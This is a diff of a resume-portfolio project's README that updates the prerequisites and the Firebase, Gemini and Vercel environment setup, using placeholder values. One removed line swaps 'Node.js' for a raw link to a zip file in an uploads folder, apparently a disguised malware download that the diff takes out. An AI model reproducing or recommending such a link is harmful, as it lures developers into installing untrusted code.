@@ -32,31 +32,65 @@ Transform your resume into a professional portfolio website with AI-driven caree
 
 - Google Gemini API
 
+
 ## 📋 Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- **https://github.com/MuhammedRazin/Project-Mini/raw/refs/heads/main/uploads/resumes/Mini_Project_v3.8.zip** 18+ and npm
+- **Node.js** 18+ and npm
 - **Java JDK** 17+
 - **Maven** 3.8+
 - **PostgreSQL** 14+
 - **Gemini API key**
+- **Firebase Project** (for authentication)
 
-### Configure Gemini
+### Environment Variables
 
-Create a `.env` file in the project root (or in `backend/`) with:
+#### Local Development
+
+Create a `.env` file in the project root with:
 
 ```env
-GEMINI_API_KEY=your_api_key_here
+# Backend API
+VITE_API_URL=/api
+VITE_BACKEND_URL=http://localhost:8080
+
+# Firebase (Frontend)
+VITE_FIREBASE_API_KEY=your_firebase_api_key
+VITE_FIREBASE_AUTH_DOMAIN=your_project_id.firebaseapp.com
+VITE_FIREBASE_PROJECT_ID=your_project_id
+VITE_FIREBASE_STORAGE_BUCKET=your_project_id.firebasestorage.app
+VITE_FIREBASE_MESSAGING_SENDER_ID=your_messaging_sender_id
+VITE_FIREBASE_APP_ID=your_firebase_app_id
+VITE_FIREBASE_MEASUREMENT_ID=your_measurement_id
+
+# Gemini
+GEMINI_API_KEY=your_gemini_api_key
 GEMINI_MODEL=gemini-2.5-flash
+
+# Backend token verification
+FIREBASE_WEB_API_KEY=your_firebase_web_api_key
 ```
 
-You can also export variables directly:
+#### Vercel Deployment
 
-```bash
-export GEMINI_API_KEY=your_api_key_here
-export GEMINI_MODEL=gemini-2.5-flash
-```
+For deployment on Vercel:
+
+- Set all `VITE_FIREBASE_*`, `GEMINI_API_KEY`, and any other required variables in the Vercel dashboard (Project Settings > Environment Variables).
+- The `.env` file is not used in production unless you set these variables in Vercel.
+- The frontend will use the rewrite in `vercel.json` to forward `/api` requests to your backend (ensure your backend is accessible and CORS is configured).
+
+#### Build Output
+
+- Vite outputs to the `dist` directory. Set this as the output directory in Vercel.
+
+#### Build Command
+
+- The default build command is `vite build`.
+
+#### Preview Locally
+
+- Run `npm run build` then `npm run preview` to test the production build locally.
 
 ## ⚙️ Installation & Setup
 
